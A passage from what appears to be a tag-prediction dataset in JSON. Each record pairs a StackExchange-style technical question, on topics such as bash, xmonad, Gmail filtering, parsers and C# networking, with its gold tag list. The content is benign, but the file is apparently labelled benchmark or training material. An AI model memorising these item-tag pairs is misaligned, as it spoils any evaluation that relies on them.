range(len(coordinate)):    ti = coordinate[q] # r coordinate of the q_th quadrature point    #Transform this to r space [r,0]    a = 0    b = 1    r = transfo1D(a,b,ti)    dettransform = (b-a)/2.0    #Define ds = fct(r) = fct(r(t))    S,dSdx,dSdy,detJ,j11,j12,j21,j22 = isopmap(x,y,r,0,P1shapes)    ds = math.sqrt(math.pow(j11,2) + math.pow(j12,2))    #Define B(P(r,0),Q(r,0)) = B(P(r(t),0),Q(r(t),0))    x_physical = np.dot(x,S)    y_physical = np.dot(y,S)    B_gausspoint = B(x_physical,y_physical)    wxarea = weight[q] * B_gausspoint* ds * dettransform    int_total += wxareaprint int_total",
    "target": "finite element;boundary conditions;quadrature"
  },
  {
    "id": "_unix.4325",
    "source": "truncating file names <eos> I have a folder that has a number of files all of a similar form as:Dropkick Murphys - 01 - Walk Away.mp3Dropkick Murphys - 02 - Workers Song.mp3And so forth...I want to convert them all so that they appear as:01 - Walk Away.mp302 - Workers Song.mp3How can I do this?",
    "target": "command line;bash"
  },
  {
    "id": "_webapps.102442",
    "source": "Combobox in Google Forms <eos> I'm working on a demo for a business user to see if Google Forms can provide a quick solution to gathering some data.  One of the requirements is a Combobox for one of the fields, where the user can either type into the text field or a dropdown will suggest options. I know there is a drop down option, but is there something more I can do with scripting or custom coding to add this feature?",
    "target": "google forms"
  },
  {
    "id": "_webapps.42771",
    "source": "Emails sent to Gmail domain suddenly not RFC 2822 compliant, Possible to bypass with Google Apps? <eos> Four days ago emails sent to our Gmail accounts via our ISP's mail servies started being rejected due to not being RFC 2822 complainant.The following message to  was undeliverable. The reason for the problem:  5.3.0 - Other mail system problem 550-'5.7.1 [2001:44b8:8060:ff02:300:1:6:6 11] Our system has detected that\\n5.7.1 this message is not RFC 2822 compliant. To reduce the amount of spam\\n5.7.1 sent to Gmail, this message has been blocked. Please review\\n5.7.1 RFC 2822 specifications for more information.  iw4si27447595pac.153 - gsmtp'Its frustrating because these emails have been working fine for over a yearI'm assuming Google has upped their filters in the last week. The email address we are trying to send to belongs to our Google Apps for Business account. I'm wondering, is there a way to override the RFC 2822 compliance filter to allow the emails to come through?So far, adding the ISPs domain name to the spam whitelist in Gmail settings (in the Apps control panel) hasnt worked.The telnet log for the rejected message in question is:220-ipmail06.adl6.xxxxx.net ESMTP 220 ESMTP; eth2958.xxx.adsl.OurISP.net [150.xxx.xxx.xx1] in MTAHELO WINDOWS-xxxxx (<- this is our server name) 250 ipmail06.adl6.OurISP.net MAIL FROM: account@OurISP.net250 sender ok RCPT TO: admin@googleappsdomain.com250 recipient ok RCPT TO: admin@DifferentGoogleAppsDomain.com250 recipient ok DATA 354 go ahead Subject: Test email from the Avid ISIS Notification Application This message was generated by Avid ISIS Notification Application. . QUIT 250 ok: Message 716893804 accepted",
    "target": "gmail;google apps;spam prevention"
  },
  {
    "id": "_webmaster.100031",
    "source": "Firebase hosting not going live - stuck on Continue setup to direct traffic to your domain <eos> I'm stuck on the last stage(going live) of Firebase hosting. I have a Godaddy domain:As u can see i put down all the CNAME and A records.I'm adding my firebase.json in case it's conneted in some manner.So,what I'm doing wrong?How can I make it work?Notice that the site works..But i believe something is wrong, otherwise firebase would finish the process.tnx",
    "target": "web hosting;dns;godaddy;cname"
  },
  {
    "id": "_codereview.169740",
    "source": "Updating persons in database with newly created addresses <eos> I have the following code, and I'd like to refactor it to a more functional way:public void processPersons(List<Person> personList) {    for (Person person : personList) {        Integer addressId = createAddress(person);        if (addressId != null) {            updateDbStatus(addressId, person);        }    }}How do I convert the above to a more functional style of programming?",
    "target": "java;functional programming"
  },
  {
    "id": "_unix.351615",
    "source": "How to add a file to a zip with another filename? <eos> Given a file wrong_name.txt, how can I add it to a zip archives archive.zip with an other name right_name.txt without modifying the file itself.",
    "target": "rename;zip"
  },
  {
    "id": "_unix.33529",
    "source": "Is there a way to integrate the unix man pages into OSX's Dictionary app? <eos> I was thinking it would be cool to be able to look things up in the man pages the same way one looks up words with the Dictionary app.  Is there a way to add the man pages that OSX supplies into the Dictionary app so when you right click on a word (or in this case, a unix function/keyword/etc.), and click Look Up in Dictionary, it can search for the word in the man pages too and integrate the search results into the Dictionary window?  So when the window pops up, the tabs across the top would be All, Dictionary, Thesaurus, Apple, Wikipedia, Man Pages.  Or is this too wishful of thinking?",
    "target": "osx"
  },
  {
    "id": "_unix.255423",
    "source": "How to change shell from script <eos> I want to change shell from ksh to bash and source the .kshrc file. I want to execute following lines of command sequentially:bash. ~/.kshrcclear Can anybody help me? ",
    "target": "bash;scripting;ksh"
  },
  {
    "id": "_unix.279974",
    "source": "Sudden problem with a rack/passenger ruby app: Connection closed <eos> I have a Ruby 1.8.7 app which runs under Phusion Passenger and Nginx, for one of my clients, on an Ubuntu VPS.  It's been ticking away happily for years, but yesterday ran out of log space (sending me an error via monit which i use to monitor it).I cleared out the bloated log file by doing the following:sudo cat /dev/null > log/production.logthen restarted and it was back to normal.  This morning, i've got another error, which i've not seen before.  I don't know if it's related to the log problem, it might just be a coincidence, but it's odd to get two problems so close together after literally years of nothing at all going wrong.  I haven't made any changes to anything.This is the stack trace i see:Passenger encountered the following error:The application spawner server exited unexpectedly: Connection closedException class:PhusionPassenger::Rack::ApplicationSpawner::ErrorBacktrace:#   File    Line    Location0   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/rack/application_spawner.rb 118 in `spawn_application'1   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/spawn_manager.rb    257 in `spawn_rack_application'2   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/abstract_server_collection.rb   82  in `synchronize'3   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/abstract_server_collection.rb   79  in `synchronize'4   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/spawn_manager.rb    244 in `spawn_rack_application'5   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/spawn_manager.rb    137 in `spawn_application'6   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/spawn_manager.rb    275 in `handle_spawn_application'7   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/abstract_server.rb  357 in `__send__'8   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/abstract_server.rb  357 in `server_main_loop'9   /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/lib/phusion_passenger/abstract_server.rb  206 in `start_synchronously'10  /usr/local/lib/ruby/gems/1.8/gems/passenger-3.0.2/helper-scripts/passenger-spawn-server 99  I've tried restarting it by doing touch tmp/restart.txtin the project folder, which is the normal restart procedure for the app, and also restarting nginx.  I still get the same error.Kind of out of ideas - has anyone seen this error before or have any ideas on how to fix it?",
    "target": "nginx;ruby"
  },
  {
    "id": "_unix.89089",
    "source": "How do I recursively set the date created attribute to the date modified attribute on NTFS-3G? <eos> In my first question, I asked how to get the Date created field in NTFS-3G. Now, that I know I can get the Date created, I have started adding files onto my NTFS-3G partition and would like to set the Date created of each file to its Date modified value.Since this needs to be done on a whole repository of files, I would like to recursively apply it to a single directory on down. If I know how to do this for a single file, I could probably do the recursion myself, but if you want to add that in I would be more than happy.",
    "target": "files;date;file copy;ntfs;ntfs 3g"
  },
  {
    "id": "_webmaster.5474",
    "source": "What is the idea behind occupying domains? <eos> I see that most domain names that contain some nice words like: www.pixelmania.com , www.musicbox.com and so on... are registered but look just auto-populated with some random data. Why they do this ? Is it for me to pay extra to get that domain? Is it for advertising purposes (all of them have insane amounts of ads on them)? Or what ... ?",
    "target": "domains"
  },
  {
    "id": "_reverseengineering.11811",
    "source": "How to organize vtables in IDA Pro? <eos> I am using IDA Pro to disassemble a C++ behemoth with 1600+ classes, many of them having pure virtual methods.Some classes also are made up of multiple base classes, in hierarchies 5+ levels deep.Ida PRO supports making structures of pointers, to handle vtables, but some of the final classes can have multiple different vtables in the same slot, due to heavy polymorphism, so how you organize the vtables? How you tell IDA that in this method, or that method, what vtable is actually being refered to?",
    "target": "ida;c++;hexrays"
  },
  {
    "id": "_webmaster.51011",
    "source": "Home Page plagiarism risks from a competitors <eos> What are SEO risks and what are the best courses of action via Google, when an industry competitor duplicates 95% of your home page content and passes it as their own. Especially when your own website has ranked for years etc and held this unique copy for years. Further to this - what are the implications when another industry competitor replicates both your entire site design template and word for word content across your ENTIRE website?  ",
    "target": "seo"
  },
  {
    "id": "_scicomp.21768",
    "source": "a few questions on understanding geometric conservation law <eos> I was wondering if anyone could help with understanding the geometric conservation law for moving domains. I came across Link1, and have tried to understood the paper by Farhat et al Link2. So far my understanding is that the two things to consider are 1) the time step to which the cell areas using for integration of flux terms correspond to; 2) the time step at which the mesh velocity ( $\\dot{x}$ ) is being evaluated. Finally, the ALE equations must also be satisfied for a uniform flow case. The paper states a GCL law as:$$A_{i}x^{n+1}-A_{i}x^{n}=\\int_{t^{n}}^{t^{n+1}}\\int_{\\partial C_{i}(x)}\\dot{x}\\overrightarrow{n}d\\sigma dt$$where $A$ refers to the area of cells, $C$ refers to the cell areas swept by the  fluxes, t is time, x is the spatial coordinate at the current configuration, and I think $\\sigma$ refers to the surface area of integration corresponding $C$. I have a few questions that I would really appreciate some help with:1)  what is $C$ in 1D. Is C referring to the length of the cells or the area, which is set to 1 in 1D.2) in the paper (just before equation 16), for a uniform flow, it sets the variables being solved for at different time steps equal to each other. Is that not the definition of steady flow?3) Finally, is there a way to determine whether a set of numerical results in 1D, obey GCL or not, without actually going through the equations. For instance, my understanding is that the results should stay independent of the moving domains, so if I compared the results obtained using  $\\dot{x}$ =0 and $\\dot{x} \\neq 0$ and showed that they were not the same?If there are any simpler papers or examples on GCL, please let me know. Thank you in advance.",
    "target": "finite element;fluid dynamics;finite volume;discretization"
  },
  {
    "id": "_cs.20249",
    "source": "Is $a^{n+m}b^{n}c^{m}$ context free? <eos> Language:$ L = a^{n+m}b^{n}c^{m} $As per a recent test I gave, this language is not context free.However, I think it is.Corresponding Grammar:$ X \\rightarrow aXY \\space |\\space \\epsilon $$ Y \\rightarrow b \\space | \\space c $Pushdown Automata:Keeping pushing all $a$ to the stack, until a $b$ is scanned. Keeping popping  $a$ from stack for each character scanned, until end of input.If, after the end of input the stack is empty accept the string. Else, go to non-accepting state.Please let me know if I'm thinking along the right lines or if I've missed something..",
    "target": "formal languages;context free;formal grammars"
  },
  {
    "id": "_cs.60114",
    "source": "Space-time tradeoffs for deterministic logarithmic space algorithms <eos> I have several algorithms that map read-only input into write-only output utilizing only logarithmic space with pointer arithmetic. While the algorithms have a very small $O(\\log^c{}n)$ critical path time complexity, fully parallelizing is too impractical with today's computers due to high degree polynomial growth in required resources.What are some general purpose techniques to transform logarithmic space algorithms to low sequential time complexity (preferably linear) by utilizing more space (preferably linear)?",
    "target": "time complexity;space complexity;program optimization"
  },
  {
    "id": "_hardwarecs.4054",
    "source": "Low power computer with at least two SATA ports? <eos> I want to build a low power relatively cheep NAS that can hold at least two drives. I want to go the DIY route since I'm blind and would rather do everything from the command-line instead of relying on a third party GUI that may or may not be accessible. What would good hardware be for this? All the single board computers I've found appear to have either one or no SATA ports. I'd prefer a pre-built system that only requires hard drives but can build a computer from scratch if required.",
    "target": "linux;nas"
  },
  {
    "id": "_unix.175127",
    "source": "xmobar doesn't appear <eos> I installed xmonbar and try to launch it.xmonbar &I got Stopped. I don't know what's wrong. Here is my .xmobarrcConfig { font = -misc-fixed-*-*-*-*-13-*-*-*-*-*-*-*   , borderColor = black   , border = TopB   , allDesktops = True   , overrideRedirect = True   , persistent = False   , hideOnStart = False   , bgColor = black   , fgColor = grey   , position = TopW L 100   , lowerOnStart = True   , commands = [ Run Cpu [-L,15,-H,50,--normal,green,--high,red] 10                , Run Date %a %b %_d %Y %H:%M:%S date 10                , Run StdinReader                ]   , sepChar = %   , alignSep = }{   , template = %StdinReader% }{ %cpu% | %date%   }By the way, I'm running xmonad window manager. It works well.Edit:My xmonad.hs file:---- xmonad example config file.---- A template showing all available configuration hooks,-- and how to override the defaults in your own xmonad.hs conf file.---- Normally, you'd only override those defaults you care about.--import XMonadimport System.Exitimport qualified XMonad.StackSet as Wimport qualified Data.Map        as Mimport XMonad.Hooks.DynamicLogimport XMonad.Hooks.ManageDocksimport XMonad.Util.EZConfig(additionalKeys)import System.IOimport Graphics.X11.ExtraTypes.XF86-- The preferred terminal program, which is used in a binding below and by-- certain contrib modules.--myTerminal      = xterm-- myTerminal      = gnome-terminal-- Width of the window border in pixels.--myBorderWidth   = 1-- modMask lets you specify which modkey you want to use. The default-- is mod1Mask (left alt).  You may also consider using mod3Mask-- (right alt), which does not conflict with emacs keybindings. The-- windows key is usually mod4Mask.---- myModMask       = mod1MaskmyModMask       = mod4Mask-- The mask for the numlock key. Numlock status is masked from the-- current modifier status, so the keybindings will work with numlock on or-- off. You may need to change this on some systems.---- You can find the numlock modifier by running xmodmap and looking for a-- modifier with Num_Lock bound to it:---- > $ xmodmap | grep Num-- > mod2        Num_Lock (0x4d)---- Set numlockMask = 0 if you don't have a numlock key, or want to treat-- numlock status separately.--myNumlockMask   = mod2Mask-- The default number of workspaces (virtual screens) and their names.-- By default we use numeric strings, but any string may be used as a-- workspace name. The number of workspaces is determined by the length-- of this list.---- A tagging example:---- > workspaces = [web, irc, code ] ++ map show [4..9]--myWorkspaces    = [1,2,3,4,5,6,7,8,9]-- Border colors for unfocused and focused windows, respectively.--myNormalBorderColor  = #ddddddmyFocusedBorderColor = #ff0000-------------------------------------------------------------------------- Key bindings. Add, modify or remove key bindings here.--myKeys conf@(XConfig {XMonad.modMask = modm}) = M.fromList $    -- launch a terminal    [ ((modm .|. shiftMask, xK_Return), spawn $ XMonad.terminal conf)    -- launch dmenu    , ((modm,               xK_p     ), spawn exe=`dmenu_path | dmenu_run -fn 'DejaVu Sans Mono 12'` && eval \\exec $exe\\)    -- launch Chrome browser    , ((modm, xK_b), spawn exe=`google-chrome`)    -- launch Emacs editor    , ((modm, xK_z), spawn exe=`emacs`)    -- launch gmrun    , ((modm .|. shiftMask, xK_p     ), spawn gmrun)    -- close focused window     , ((modm .|. shiftMask, xK_c     ), kill)     -- Rotate through the available layout algorithms    , ((modm,               xK_space ), sendMessage NextLayout)    --  Reset the layouts on the current workspace to default    , ((modm .|. shiftMask, xK_space ), setLayout $ XMonad.layoutHook conf)    -- Resize viewed windows to the correct size    , ((modm,               xK_n     ), refresh)    -- Move focus to the next window    , ((modm,               xK_Tab   ), windows W.focusDown)    -- Move focus to the next window    , ((modm,               xK_j     ), windows W.focusDown)    -- Move focus to the previous window    , ((modm,               xK_k     ), windows W.focusUp  )    -- Move focus to the master window    , ((modm,               xK_m     ), windows W.focusMaster  )    -- Swap the focused window and the master window    , ((modm,               xK_Return), windows W.swapMaster)    -- Swap the focused window with the next window    , ((modm .|. shiftMask, xK_j     ), windows W.swapDown  )    -- Swap the focused window with the previous window    , ((modm .|. shiftMask, xK_k     ), windows W.swapUp    )    -- Shrink the master area    , ((modm,               xK_h     ), sendMessage Shrink)    -- Expand the master area    , ((modm,               xK_l     ), sendMessage Expand)    -- Push window back into tiling    , ((modm,               xK_t     ), withFocused $ windows . W.sink)    -- Increment the number of windows in the master area    , ((modm              , xK_comma ), sendMessage (IncMasterN 1))    -- Deincrement the number of windows in the master area    , ((modm              , xK_period), sendMessage (IncMasterN (-1)))    -- toggle the status bar gap (used with avoidStruts from Hooks.ManageDocks)    -- , ((modm , xK_b ), sendMessage ToggleStruts)    -- Quit xmonad    , ((modm .|. shiftMask, xK_q     ), io (exitWith ExitSuccess))    -- Restart xmonad    , ((modm              , xK_q     ), restart xmonad True)   , ((mod4Mask .|. shiftMask, xK_z), spawn xscreensaver-command -lock),      ((0                     , 0x1008FF11), spawn amixer set Master 2-),      ((0                     , 0x1008FF13), spawn amixer set Master 2+), ((0                     , 0x1008FF12), spawn amixer set Master toggle)-- ((0, xF86XK_AudioMute          ), spawn amixer set Master toggle)        ]    ++    --    -- mod-[1..9], Switch to workspace N    -- mod-shift-[1..9], Move client to workspace N    --    [((m .|. modm, k), windows $ f i)        | (i, k) <- zip (XMonad.workspaces conf) [xK_1 .. xK_9]        , (f, m) <- [(W.greedyView, 0), (W.shift, shiftMask)]]    ++    --    -- mod-{w,e,r}, Switch to physical/Xinerama screens 1, 2, or 3    -- mod-shift-{w,e,r}, Move client to screen 1, 2, or 3    --    [((m .|. modm, key), screenWorkspace sc >>= flip whenJust (windows . f))        | (key, sc) <- zip [xK_w, xK_e, xK_r] [0..]        , (f, m) <- [(W.view, 0), (W.shift, shiftMask)]]-------------------------------------------------------------------------- Mouse bindings: default actions bound to mouse events--myMouseBindings (XConfig {XMonad.modMask = modMask}) = M.fromList $    -- mod-button1, Set the window to floating mode and move by dragging    [ ((modMask, button1), (\\w -> focus w >> mouseMoveWindow w))    -- mod-button2, Raise the window to the top of the stack    , ((modMask, button2), (\\w -> focus w >> windows W.swapMaster))    -- mod-button3, Set the window to floating mode and resize by dragging    , ((modMask, button3), (\\w -> focus w >> mouseResizeWindow w))    -- you may also bind events to the mouse scroll wheel (button4 and button5)    ]-------------------------------------------------------------------------- Layouts:-- You can specify and transform your layouts by modifying these values.-- If you change layout bindings be sure to use 'mod-shift-space' after-- restarting (with 'mod-q') to reset your layout state to the new-- defaults, as xmonad preserves your old layout settings by default.---- The available layouts.  Note that each layout is separated by |||,-- which denotes layout choice.--myLayout = avoidStruts (tiled ||| Mirror tiled ||| Full)  where     -- default tiling algorithm partitions the screen into two panes     tiled   = Tall nmaster delta ratio     -- The default number of windows in the master pane     nmaster = 1     -- Default proportion of screen occupied by master pane     ratio   = 1/2     -- Percent of screen to increment by when resizing panes     delta   = 3/100-------------------------------------------------------------------------- Window rules:-- Execute arbitrary actions and WindowSet manipulations when managing-- a new window. You can use this to, for example, always float a-- particular program, or have a client always appear on a particular-- workspace.---- To find the property name associated with a program, use-- > xprop | grep WM_CLASS-- and click on the client you're interested in.---- To match on the WM_NAME, you can use 'title' in the same way that-- 'className' and 'resource' are used below.--myManageHook = composeAll    [ className =? MPlayer        --> doFloat    , className =? Gimp           --> doFloat    , resource  =? desktop_window --> doIgnore    , resource  =? kdesktop       --> doIgnore ]-- Whether focus follows the mouse pointer.myFocusFollowsMouse :: BoolmyFocusFollowsMouse = True-------------------------------------------------------------------------- Status bars and logging-- Perform an arbitrary action on each internal state change or X event.-- See the 'DynamicLog' extension for examples.---- To emulate dwm's status bar---- > logHook = dynamicLogDzen--myLogHook = return ()-- myLogHook = dynamicLogDzen-------------------------------------------------------------------------- Startup hook-- Perform an arbitrary action each time xmonad starts or is restarted-- with mod-q.  Used by, e.g., XMonad.Layout.PerWorkspace to initialize-- per-workspace layout choices.---- By default, do nothing.-- myStartupHook = return ()myStartupHook = do          spawn python2 ~/apps/goagent-goagent-593bfa1/local/proxy.py&-------------------------------------------------------------------------- Now run xmonad with all the defaults we set up.-- Run xmonad with the settings you specify. No need to modify this.--main = xmonad defaults-- A structure containing your configuration settings, overriding-- fields in the default config. Any you don't override, will -- use the defaults defined in xmonad/XMonad/Config.hs-- -- No need to modify this.--defaults = defaultConfig {      -- simple stuff        terminal           = myTerminal,        focusFollowsMouse  = myFocusFollowsMouse,        borderWidth        = myBorderWidth,        modMask            = myModMask,--        numlockMask        = myNumlockMask,        workspaces         = myWorkspaces,        normalBorderColor  = myNormalBorderColor,        focusedBorderColor = myFocusedBorderColor,      -- key bindings        keys               = myKeys,        mouseBindings      = myMouseBindings,      -- hooks, layouts        layoutHook         = myLayout,        manageHook         = myManageHook,        logHook            = myLogHook,        startupHook        = myStartupHook    }",
    "target": "xmonad"
  },
  {
    "id": "_softwareengineering.315295",
    "source": "Code structure of third party framework <eos> Is an API always returning 200 OK, an issue?",
    "target": "c#;mvc;rest;api;solid"
  },
  {
    "id": "_codereview.10611",
    "source": "Loading data from a remote app <eos> I have a method which loads data from a remote app (send TCP request and parse response). Now, I have a simple class for sending a TCP request:public class PremieraTcpClient    {        public PremieraTcpClient()        {            QueryItems = new NameValueCollection();            int port;            int.TryParse(ConfigurationManager.AppSettings[PremieraPort], out port);            Port = port;            ServerIp = ConfigurationManager.AppSettings[PremieraServerIp];            ServiceId = ConfigurationManager.AppSettings[PremieraServiceId];        }        public NameValueCollection QueryItems { get; set; }        private int Port { get; set; }        private string ServerIp { get; set; }        private string ServiceId { get; set; }        private string ReadyQuery { get; set; }        public string SendQuery()        {                        StringBuilder parameters = new StringBuilder();            //...            // build query for request            //...            ReadyQuery = parameters.ToString();                        return Connect();                    }        private string Connect()        {            string responseData;            try            {                TcpClient client = new TcpClient(ServerIp, Port);                client.ReceiveBufferSize = Int32.MaxValue;                Byte[] data = Encoding.GetEncoding(1251).GetBytes(ReadyQuery);                NetworkStream stream = client.GetStream();                // send data                stream.Write(data, 0, data.Length);                var sizeBuffer = new byte[10];                stream.Read(sizeBuffer, 0, 10);                var sizeMessage = int.Parse(Encoding.GetEncoding(1251).GetString(sizeBuffer, 0, 10));                 data = new Byte[sizeMessage];                var readSoFar = 0;                //read data                while (readSoFar < sizeMessage)                {                    readSoFar += stream.Read(data, readSoFar, data.Length - readSoFar);                }                responseData = Encoding.GetEncoding(1251).GetString(data, 0, data.Length);                                responseData = responseData.TrimStart('&');                               stream.Close();                client.Close();                return responseData;            }            catch (ArgumentNullException e)            {                //return responseData = string.Format(ArgumentNullException: {0}, e);            }            catch (SocketException e)            {                //return responseData = string.Format(SocketException: {0}, e);            }            return string.Empty;        }        }This is method for load data: private static void GetUpdatesFromPremiera()        {            Debug.WriteLine(DateTime.Now + :GetUpdatesFromPremiera);            PremieraTcpClient client = new PremieraTcpClient();            client.QueryItems.Add(QueryCode, QueryCode.GetUpdates.ToString());            client.QueryItems.Add(ListType, Movie;Hall;Session;Place;Delete);            client.QueryItems.Add(Updates, _lastUpdateId);            _lastUpdateId = String.Empty;            var response = client.SendQuery();            // here parse response            //...        }This code works fine. But, now I have to load data from two remote app (tomorrow may be three).The simple solution is to iterate through all remote apps:private static void GetUpdatesFromPremiera(){   foreach(var remoteApp in listRemoteApp)   {        PremieraTcpClient client = new PremieraTcpClient();        // here assigned different properties        var response = client.SendQuery();   }}Is there is a better way of doing it? Also, each time a connection is established, I think it impacts performance greatly.",
    "target": "c#;asp.net mvc 3;tcp"
  },
  {
    "id": "_webmaster.6485",
    "source": "Where can I register .tw domain extensions? <eos> I'm currently looking to register the Taiwanese version of my company's domain. Dynadot, doesn't register domains with that extension. I found a few places on the web: Godaddy has them, and a fewer smaller, shadier places claim to have them, but they start at $39.99/year which seems a bit outrageous. Has anyone found a more affordable, reliable registration company for .tw domains?  ",
    "target": "domains;domain registration"
  },
  {
    "id": "_unix.357926",
    "source": "How can I configure my locale correctly for Spacemacs? <eos> When I start Spacemacs I get a box created out of \\u2502 sequences which I assume is the a box of  particular character or colour not rendering properly. Below is the output from the locale command. What settings to I have to apply globally, or in my .bashrc etc to fix this?LANG=en_GBLANGUAGE=:en_GB.utf8LC_CTYPE=en_GBLC_NUMERIC=en_GBLC_TIME=en_GBLC_COLLATE=en_GBLC_MONETARY=en_GBLC_MESSAGES=en_GBLC_PAPER=en_GBLC_NAME=en_GBLC_ADDRESS=en_GBLC_TELEPHONE=en_GBLC_MEASUREMENT=en_GBLC_IDENTIFICATION=en_GBLC_ALL=",
    "target": "locale"
  },
  {
    "id": "_cs.33999",
    "source": "LALR(1) parsers and the epsilon transition <eos> I am having trouble getting my head wrapped around epsilon transitions while creating an LALR(1) parse table.Here's a grammar that recognizes any number of 'a' followed by a 'b'. 'S' is an artificial start state. '$' is an artificial 'EOS' token.0.    S -> A $1.    A -> B b2.    B -> B a3.    B -> epsilonItemsets:i0: S -> . A $    A -> .B b    B -> .B a    A -> B . b  ! because B could -> epsilon    B -> B . a  !    i1: S -> A . $i2: S -> A $ .i3: A -> B . b  ! from i0    B -> B . ai4: A -> B b .  ! from i0 or i3; the LALR algorithm compresses identical states.i5: B -> B a .  ! from i0 or i3: the LALR algorithm compresses identical states.I previously had a description on how this would work to parse a simple string. I removed it because I know less now than I did before. I can't even figure out a parse tree for 'ab'.If someone could show me how I have mis-constructed my itemsets and how I'd reduce the epsilon transition I'd be grateful.",
    "target": "formal grammars;parsers"
  },
  {
    "id": "_codereview.1099",
    "source": "Linked List program <eos> This is a simple linked list program which creates a list by appending an object at the tail. It compiles and runs perfectly.Is the coding style, logic etc are fine? How can I improve this program?  Is there anything redundant or did I miss out some important things?#include<iostream>#include<string>using namespace std;class Link_list {private:    string name;    Link_list *next_node;public:    void add_item(Link_list *);    void add_item();    friend void show(Link_list *sptr)    {        while(sptr) {        cout << sptr->name << endl;        sptr = sptr->next_node;        }     }};void Link_list::add_item(){    cin >> name;    next_node = NULL;}void Link_list::add_item(Link_list *pptr){    cin >> name;    next_node = NULL;     pptr->next_node = this; }int main(){    Link_list *str_ptr = NULL;    Link_list *curr_ptr = str_ptr;    Link_list *prev_ptr;    char ch = 'y';    str_ptr = new(Link_list);    str_ptr->add_item();    curr_ptr = str_ptr;    do    {        prev_ptr = curr_ptr;        curr_ptr = new(Link_list);        curr_ptr->add_item(prev_ptr);        cout <<Do you want to add the item << endl;        cin >> ch;    }while(ch != 'n');    show(str_ptr);  }",
    "target": "c++;linked list"
  },
  {
    "id": "_codereview.70457",
    "source": "Prefer simplicity over testability? <eos> Currently I try to create some unit tests for a project, which provides access to some webservice methods.It's interface is rather simple. I have a class WebService which offers methods like CreatePDF.Here's a little example:The Model:The model contains a number of properties, which each represent a URL parameter of the webservice. The models provide a method GetParameterDictionary, which delivers a dictionary with key == url parameter name and value == url parameter value.public class CreatePDFParameters{        public List<string> Names { get; set; }        public List<string> Colors { get; set; }        public Dictionary<string, string> GetParameterDictionary()        {            [...] //returns Key == url parameter name and Value == ; separated list of values        }}So here's a example for the Interface method:public byte[] CreatePDF(CreatePDFParameters parameters){    return MakeByteRequest(GetQuery(WebServiceMethods.CreatePDF, parameters.GetParameterDictionary()));}/// <summary>///     Creates a query out of a dictionary. The dictionary must have the paramname as key and the value as value!/// </summary>private string GetQuery(string methodName, Dictionary<string, string> parameters){    string parameterString = parameters.Where(parameter => !String.IsNullOrEmpty(parameter.Value))    .Aggregate(String.Empty, (current, parameter) => String.Format(String.IsNullOrEmpty(current) ? {0}?{1}={2} : {0}&{1}={2}, current, parameter.Key, parameter.Value));    return methodName + parameterString;}As you can see, you only need to call the CreatePDF method with a parameters object. The method itself calls a methods, which creates the query and calls a method, which makes the actual request (It calls directly the ByteRequest method, there are methods like StringRequest (delivers a string as return value) too).I would like to write a UnitTest for the GetQuery method. But I don't want to make it public or internal in the actual state. I could make the method public If I would remove the CreatePDF method and let the user make direkt calls to MakeByteRequest / GetQuery and so on - which would require the users to have some knowledge about the webservice itself (knowledge about return types, web method names and so on).Would you prefer a more simple interface over unit tests in this case?",
    "target": "c#;unit testing"
  },
  {
    "id": "_cstheory.1574",
    "source": "Do you use any article organizers? <eos> There is an increasing number of scientific articles which I look through and somehow I feel a lack of a tool to keep track of the already read ones and my summary notes on it. Or another usage scenario would be to search by an author and see which articles of the given author I have already read.The question is: Do you use or know of any freeware tools for organizing articles?",
    "target": "soft question"
  },
  {
    "id": "_unix.178903",
    "source": "linux + top command <eos> I run the top command on my linux machine and I see that vim command take like 99.5% CPU PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                                      23320 gsachde   25   0 10720 3500 2860 R 99.5  0.2  30895:11 vim  how to verify which script/program is it?  ",
    "target": "linux;command;cpu;process management"
  },
  {
    "id": "_softwareengineering.122436",
    "source": "Should back end processes be included in use cases in requirements document? <eos> We're writing a requirements document for our client and need to include the use cases of the system. We're following this template:IDDescriptionActorsPreconditionBasic StepsAlternate StepsExceptionsBusiness validations/RulesPostconditionsIn the Basic Steps section, should we include steps that the system performs in the back end or should we only include steps that the user directly interacts with?Example:Basic Steps for Search 1:User goes to search pageUser enters termUser presses searchSystem matches search term with database entriesSystem displays resultsvsBasic Steps for Search 2:User goes to search pageUser enters termUser presses searchSystem displays results",
    "target": "requirements"
  },
  {
    "id": "_cs.71962",
    "source": "Why are there only 2^i configurations? <eos> In the proof of TQBF-complete, it says if the input size is i, then the TM for the input has at most 2^i numbers of configuration. Can someone explain why?The proof is from: http://zoo.cs.yale.edu/classes/cs468/fall12/TQBF-complete.pdf",
    "target": "turing machines"
  },
  {
    "id": "_codereview.71713",
    "source": "Super simple way of generating dynamic interfaces in Python both CLI and Web GUI <eos> I want to know if this is a good idea. It is definitely only a proof of concept at this point, but if it's a good idea I would pursue the development into a more mature product.  There are three main parts of this concept (maybe they should be separate questions, but I am asking about the concept as a whole and whether it conforms to acceptable standards or is just a bad idea):Create a single file Python interpreter (sort of) which will be compiled with pyinstaller for various platforms and included with the distribution of the app. This allows a completely pluggable system of command line utilities written in Python.Create a library which provides a decorator which creates a command line interface dynamically based on the function signature.Provide a production-ready server based on Bottle and CherryPy which serves a Web GUI based on a very simple plugin system.To this end I created a project on GitHub, and I would recommend looking at the structure and source code there, but I am including the most relevant pieces of code here as per the recommendations of the moderators.This is the code in magic.py which executes the python scripts. Note that the main point of this is to compile this code with pyinstaller so there is a one-step build process and it provides a pluggable system of command line utilities (also note the ellipses):# I want to make __future__ available, but it must be at the beginning.import __future__from config import get_configimport loggingimport sysimport osif False:    # The following modules (even though they are not actually imported)    # are meant to be available. When this module is packaged with pyinstaller    # It will make these modules available for import or in other words they    # will be bundled in the executable.    import re    import xml    ...    import cherrypyconfig = get_config(logging.conf)log_level = config.getint('logging', log_level)logger = logging.getLogger('magic')logger.setLevel(log_level)formatter = 